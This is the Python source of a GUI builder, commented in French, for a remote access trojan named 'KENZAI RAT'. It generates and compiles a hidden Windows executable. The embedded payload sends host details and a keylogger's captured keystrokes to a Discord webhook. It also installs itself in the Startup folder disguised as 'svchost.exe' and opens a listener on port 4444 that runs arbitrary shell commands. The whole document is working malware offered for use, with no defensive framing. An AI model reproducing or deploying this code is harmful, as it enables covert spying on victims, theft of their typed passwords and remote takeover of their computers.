#!/usr/bin/env python3
# KENZAI RAT BUILDER v2.0 - RAT avec contrôle Discord

import os
import sys
import json
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, END
from datetime import datetime

RED = '#ff0000'
GREEN = '#00ff00'
CYAN = '#00ffff'
YELLOW = '#ffff00'
WHITE = '#ffffff'
BLACK = '#000000'
PANEL = '#0a0a0a'

class KenzaiRATBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("KENZAI RAT BUILDER v2.0")
        self.root.geometry("950x800")
        self.root.configure(bg=BLACK)
        self.root.resizable(False, False)
        self.setup_ui()
        self.center_window()
    
    def center_window(self):
        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (w // 2)
        y = (self.root.winfo_screenheight() // 2) - (h // 2)
        self.root.geometry(f'{w}x{h}+{x}+{y}')
    
    def setup_ui(self):
        header = tk.Frame(self.root, bg=BLACK)
        header.pack(fill=tk.X, padx=10, pady=5)
        
        logo_text = f"""
{RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{WHITE}
{CYAN}   - KENZAI RAT BUILDER v2.0 -{WHITE}
{YELLOW}   - Controle a distance via Discord -{WHITE}
"""
        
        tk.Label(header, text=logo_text, font=('Courier', 8), 
                fg=GREEN, bg=BLACK, justify=tk.LEFT).pack()
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background=BLACK)
        style.configure('TNotebook.Tab', background=PANEL, 
                       foreground=GREEN, padding=[15,5])
        style.map('TNotebook.Tab', background=[('selected', RED)])
        
        builder_tab = tk.Frame(self.notebook, bg=BLACK)
        self.notebook.add(builder_tab, text=" BUILDER ")
        self.setup_builder_tab(builder_tab)
        
        logs_tab = tk.Frame(self.notebook, bg=BLACK)
        self.notebook.add(logs_tab, text=" LOGS ")
        self.setup_logs_tab(logs_tab)
        
        self.status = tk.Label(self.root, text=" READY ", bd=1, relief=tk.SUNKEN,
                              anchor=tk.W, fg=GREEN, bg=PANEL)
        self.status.pack(side=tk.BOTTOM, fill=tk.X)
    
    def setup_builder_tab(self, parent):
        main = tk.Frame(parent, bg=BLACK)
        main.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        cfg = tk.LabelFrame(main, text=" CONFIGURATION ", font=('Arial',11,'bold'),
                           fg=RED, bg=PANEL)
        cfg.pack(fill=tk.X, pady=10)
        
        tk.Label(cfg, text="Webhook Discord:", fg=GREEN, bg=PANEL,
                font=('Arial',10)).grid(row=0, column=0, padx=10, pady=10, sticky=tk.W)
        self.webhook_entry = tk.Entry(cfg, width=65, bg=BLACK, fg=GREEN,
                                     insertbackground=GREEN, font=('Arial',10))
        self.webhook_entry.grid(row=0, column=1, padx=10, pady=10)
        
        tk.Label(cfg, text="Nom du fichier .exe:", fg=GREEN, bg=PANEL,
                font=('Arial',10)).grid(row=1, column=0, padx=10, pady=10, sticky=tk.W)
        self.filename_entry = tk.Entry(cfg, width=65, bg=BLACK, fg=GREEN,
                                      insertbackground=GREEN, font=('Arial',10))
        self.filename_entry.grid(row=1, column=1, padx=10, pady=10)
        self.filename_entry.insert(0, "rat.exe")
        
        opts = tk.LabelFrame(main, text=" OPTIONS ", font=('Arial',11,'bold'),
                            fg=RED, bg=PANEL)
        opts.pack(fill=tk.X, pady=10)
        
        self.persistence = tk.BooleanVar()
        self.keylogger = tk.BooleanVar()
        
        tk.Checkbutton(opts, text="Persistance au demarrage", variable=self.persistence,
                      fg=GREEN, bg=PANEL, selectcolor=BLACK).grid(row=0, column=0, padx=20, pady=5, sticky=tk.W)
        tk.Checkbutton(opts, text="Keylogger", variable=self.keylogger,
                      fg=GREEN, bg=PANEL, selectcolor=BLACK).grid(row=0, column=1, padx=20, pady=5, sticky=tk.W)
        
        btn_frame = tk.Frame(main, bg=BLACK)
        btn_frame.pack(pady=20)
        
        self.build_btn = tk.Button(btn_frame, text="BUILD RAT", 
                                   font=('Arial', 12, 'bold'), bg=RED, fg=BLACK,
                                   padx=20, pady=10, command=self.build_rat)
        self.build_btn.pack()
        
        console = tk.LabelFrame(main, text=" CONSOLE ", font=('Arial',11,'bold'),
                               fg=RED, bg=PANEL)
        console.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.console = scrolledtext.ScrolledText(console, height=12, bg=BLACK, 
                                                fg=GREEN, font=('Courier', 9))
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def setup_logs_tab(self, parent):
        frame = tk.Frame(parent, bg=BLACK)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        self.logs_text = scrolledtext.ScrolledText(frame, bg=BLACK, fg=GREEN,
                                                   font=('Courier',9))
        self.logs_text.pack(fill=tk.BOTH, expand=True)
        
        btn_frame = tk.Frame(frame, bg=BLACK)
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Effacer les logs", bg=PANEL, fg=GREEN,
                 padx=10, command=self.clear_logs).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Sauvegarder les logs", bg=PANEL, fg=GREEN,
                 padx=10, command=self.save_logs).pack(side=tk.LEFT, padx=5)
    
    def log(self, msg):
        self.logs_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.logs_text.see(tk.END)
        self.status.config(text=f" {msg[:50]} ")
        self.root.update()
    
    def clear_logs(self):
        self.logs_text.delete(1.0, END)
    
    def save_logs(self):
        filename = f"kenzai_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(self.logs_text.get(1.0, END))
        messagebox.showinfo("Succès", f"Logs sauvegardés: {filename}")
    
    def build_rat(self):
        webhook = self.webhook_entry.get().strip()
        filename = self.filename_entry.get().strip()
        
        if not webhook:
            messagebox.showerror("Erreur", "Webhook requis")
            return
        if not filename:
            filename = "rat.exe"
        if not filename.endswith('.exe'):
            filename += '.exe'
        
        self.build_btn.config(state=tk.DISABLED, text="COMPILATION...")
        self.log(f"Début construction: {filename}")
        
        def build_thread():
            try:
                persistence = "True" if self.persistence.get() else "False"
                keylogger = "True" if self.keylogger.get() else "False"
                
                payload = self.generate_payload(webhook, persistence, keylogger)
                
                with open("rat_payload.py", "w", encoding="utf-8") as f:
                    f.write(payload)
                
                self.log("Compilation en .exe... (30-60s)")
                
                subprocess.run(
                    [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", 
                     "--name", filename.replace(".exe", ""), "rat_payload.py"],
                    capture_output=True
                )
                
                if os.path.exists(f"dist\\{filename}"):
                    size = os.path.getsize(f"dist\\{filename}")
                    self.log("BUILD REUSSI !")
                    self.log(f"Fichier: dist\\{filename} ({size:,} bytes)")
                    messagebox.showinfo("Succès", f"RAT construit !\n\nFichier: dist\\{filename}")
                else:
                    self.log("ERREUR: Échec compilation")
                
                for f in ["rat_payload.py", "rat_payload.spec"]:
                    if os.path.exists(f): os.remove(f)
                if os.path.exists("build"):
                    shutil.rmtree("build")
                    
            except Exception as e:
                self.log(f"ERREUR: {str(e)}")
            finally:
                self.build_btn.config(state=tk.NORMAL, text="BUILD RAT")
        
        threading.Thread(target=build_thread, daemon=True).start()
    
    def generate_payload(self, webhook, persistence, keylogger):
        return f'''import os, sys, json, requests, time, socket, subprocess, getpass, platform, threading
from datetime import datetime

WEBHOOK = "{webhook}"
PERSIST = {persistence}
KEYLOG = {keylogger}

def send_embed(title, desc, color=0xff0000):
    try:
        requests.post(WEBHOOK, json={{"embeds": [{{"title": title, "description": desc[:1900], "color": color}}]}}, timeout=10)
    except: pass

def send_msg(msg):
    try:
        requests.post(WEBHOOK, json={{"content": msg}}, timeout=10)
    except: pass

def get_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "?"
    return f"PC: {{socket.gethostname()}}\\nUser: {{getpass.getuser()}}\\nOS: {{platform.system()}}\\nIP: {{ip}}"

def execute_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except:
        return "Erreur"

def reboot():
    os.system("shutdown /r /t 5")
    return "Redemarrage dans 5s"

def open_app(app):
    os.system(f"start {{app}}")
    return f"Ouverture de {{app}}"

def persist():
    if not PERSIST:
        return
    try:
        import shutil
        dest = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.argv[0], dest)
    except: pass

def keylogger_thread():
    if not KEYLOG:
        return
    try:
        from pynput import keyboard
        log = ""
        def on_press(key):
            nonlocal log
            try:
                log += key.char
            except:
                log += f" [{{key}}] "
            if len(log) > 200:
                send_msg(f"Keylog: {{log}}")
                log = ""
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except: pass

def main():
    send_embed("NOUVEAU CLIENT", get_info(), 0x00ff00)
    persist()
    keylogger_thread()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 4444))
    s.listen(5)
    
    while True:
        conn, addr = s.accept()
        while True:
            try:
                data = conn.recv(4096).decode()
                if not data:
                    break
                if data == "info":
                    conn.send(get_info().encode())
                elif data == "reboot":
                    conn.send(reboot().encode())
                elif data.startswith("open "):
                    conn.send(open_app(data[5:]).encode())
                elif data.startswith("cmd "):
                    r = execute_cmd(data[4:])
                    conn.send(r.encode()[:4000])
                elif data == "kill":
                    conn.send(b"dying")
                    sys.exit()
            except:
                break
        conn.close()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        send_msg(f"Erreur: {{str(e)}}")
'''
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = KenzaiRATBuilder()
    app.run()